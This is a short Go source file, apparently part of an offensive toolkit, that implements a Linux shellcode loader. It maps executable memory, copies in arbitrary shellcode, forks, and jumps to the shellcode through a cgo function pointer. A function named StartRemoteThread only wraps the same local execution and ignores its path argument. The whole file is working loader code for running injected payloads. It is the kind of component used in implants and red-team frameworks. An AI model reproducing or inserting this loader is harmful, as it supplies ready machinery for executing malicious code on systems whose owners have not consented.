//go:build linux

package shellcode

import (
	"syscall"
	"unsafe"
	"fmt"
)

/*
#include <unistd.h>

void call(void *ptr) {
	// Continue on a new thread or return
	if(fork()) {
		return;
	}

	// Cast the pointer (to the shellcode) to a function pointer and calls the function
	( *(void(*) ()) ptr)();
}
*/
import "C"


func ExecShellcode(shellcode []byte) error{
	//Execute(shellcode)
	//return nil
	mem, err := syscall.Mmap(-1, 0, len(shellcode),
		syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC, syscall.MAP_ANON|syscall.MAP_PRIVATE)
	if err != nil {
		return fmt.Errorf("failed to mmap memory: %v", err.Error())
	}

	copy(mem, shellcode)
	//entry := unsafe.Pointer(&mem[0])
	//syscall.Syscall(uintptr(entry), 0, 0, 0)
	C.call( unsafe.Pointer(&mem[0]) )
	return nil
}

func StartRemoteThread(shellcode []byte, binaryPath string) error {
	return ExecShellcode(shellcode)
}


